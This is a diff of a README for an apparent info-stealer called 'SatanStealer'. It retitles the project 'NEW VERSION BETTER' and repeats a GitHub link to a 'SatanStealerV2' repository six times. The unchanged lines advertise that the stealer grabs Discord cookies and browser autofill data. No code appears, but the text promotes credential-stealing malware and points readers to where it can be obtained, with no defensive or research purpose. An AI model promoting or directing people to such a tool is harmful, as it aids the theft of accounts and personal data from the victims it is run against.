@@ -1,4 +1,15 @@
-# SatanStealer
+# NEW VERSION BETTER
+https://github.com/HatGirl-zz/SatanStealerV2
+https://github.com/HatGirl-zz/SatanStealerV2
+
+https://github.com/HatGirl-zz/SatanStealerV2
+
+https://github.com/HatGirl-zz/SatanStealerV2
+
+https://github.com/HatGirl-zz/SatanStealerV2
+
+https://github.com/HatGirl-zz/SatanStealerV2
+#
 Stealer grab discord cookie
 autofils..<br>
 » Best grab 
